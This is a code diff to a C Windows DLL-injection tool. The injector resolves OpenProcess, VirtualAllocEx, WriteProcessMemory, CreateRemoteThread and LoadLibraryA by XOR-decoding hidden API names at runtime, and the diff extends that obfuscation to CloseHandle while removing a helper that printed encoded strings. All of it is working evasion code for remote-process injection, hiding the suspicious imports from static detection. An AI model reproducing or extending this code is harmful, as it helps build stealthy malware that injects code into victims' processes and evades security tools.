@@ -13,10 +13,11 @@
 
 #define KEY 0xaa
 
-typedef HANDLE (*t_op) (DWORD, BOOL, DWORD);
-typedef LPVOID (*t_vae)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
-typedef BOOL   (*t_wpm)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T);
-typedef HANDLE (*t_crt)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+typedef HANDLE (*t_op)  (DWORD, BOOL, DWORD);
+typedef LPVOID (*t_vae) (HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+typedef BOOL   (*t_wpm) (HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T);
+typedef HANDLE (*t_crt) (HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+typedef BOOL   (*t_ch)  (HANDLE);
 
 /**
  * \fn void print_help()
@@ -64,23 +65,6 @@ void get_args(const int argc, const char *argv[], char *path, DWORD *pid) {
   } else {
     print_help();
   }
-}
-
-/**
- * \fn void print_xor_string(const char *name, const int len, const unsigned char key)
- * \brief Function used to display the result of a char* array following an xor.
- *
- * \param[in] name The target character string.
- * \param[in] len The size of the "name" parameter.
- * \param[in] key The key to apply a xor.
- */
-void print_xor_string(const char *name, const int len, const unsigned char key) {
-  printf("{");
-  for (int i = 0; i < len; ++i) {
-    printf("0x%02x, ", (name[i] ^ key));
-  }
-  printf("0x00}");
-  printf("\n");
 }
 
 /**
@@ -132,6 +116,7 @@ void inject_dll(const char *path, const DWORD pid) {
   char writeprocessmemory_xor_name[] = {0xfd, 0xd8, 0xc3, 0xde, 0xcf, 0xfa, 0xd8, 0xc5, 0xc9, 0xcf, 0xd9, 0xd9, 0xe7, 0xcf, 0xc7, 0xc5, 0xd8, 0xd3, 0x00};
   char createremotethread_xor_name[] = {0xe9, 0xd8, 0xcf, 0xcb, 0xde, 0xcf, 0xf8, 0xcf, 0xc7, 0xc5, 0xde, 0xcf, 0xfe, 0xc2, 0xd8, 0xcf, 0xcb, 0xce, 0x00};
   char loadlibrarya_xor_name[] = {0xe6, 0xc5, 0xcb, 0xce, 0xe6, 0xc3, 0xc8, 0xd8, 0xcb, 0xd8, 0xd3, 0xeb, 0x00};
+  char closehandle_xor_name[] = {0xe9, 0xc6, 0xc5, 0xd9, 0xcf, 0xe2, 0xcb, 0xc4, 0xce, 0xc6, 0xcf, 0x00};
 
   // Allocations of the variables which will contain the deciphered names.
   char *kernel32_name = (char *) malloc(sizeof(kernel32_xor_name));
@@ -140,6 +125,7 @@ void inject_dll(const char *path, const DWORD pid) {
   char *writeprocessmemory_name = (char *) malloc(sizeof(writeprocessmemory_xor_name));
   char *createremotethread_name = (char *) malloc(sizeof(createremotethread_xor_name));
   char *loadlibrarya_name = (char *) malloc(sizeof(loadlibrarya_xor_name));
+  char *closehandle_name = (char *) malloc(sizeof(closehandle_xor_name));
 
   // Decrypt names.
   xor_string(kernel32_xor_name, sizeof(kernel32_xor_name), KEY, kernel32_name);
@@ -148,12 +134,14 @@ void inject_dll(const char *path, const DWORD pid) {
   xor_string(writeprocessmemory_xor_name, sizeof(writeprocessmemory_xor_name), KEY, writeprocessmemory_name);
   xor_string(createremotethread_xor_name, sizeof(createremotethread_xor_name), KEY, createremotethread_name);
   xor_string(loadlibrarya_xor_name, sizeof(loadlibrarya_xor_name), KEY, loadlibrarya_name);
+  xor_string(closehandle_xor_name, sizeof(closehandle_xor_name), KEY, closehandle_name);
 
   // Retrieve pointers to functions whose names have been decrypted.
   t_op op = (t_op) GetProcAddress(GetModuleHandle(TEXT(kernel32_name)), openprocess_name);
   t_vae vae = (t_vae) GetProcAddress(GetModuleHandle(TEXT(kernel32_name)), virtualallocex_name);
   t_wpm wpm = (t_wpm) GetProcAddress(GetModuleHandle(TEXT(kernel32_name)), writeprocessmemory_name);
   t_crt crt = (t_crt) GetProcAddress(GetModuleHandle(TEXT(kernel32_name)), createremotethread_name);
+  t_ch ch = (t_ch) GetProcAddress(GetModuleHandle(TEXT(kernel32_name)), closehandle_name);
 
   //Inject the DLL.
   /*
@@ -197,7 +185,12 @@ void inject_dll(const char *path, const DWORD pid) {
   if (!hret) {
     error(createremotethread_name);
   }
-  CloseHandle(hp);
+
+  /*
+    Equivalent to the following line of code:
+    CloseHandle(hp);
+  */
+  ch(hp);
 
   // Free buffers containing decrypted names.
   free(kernel32_name);
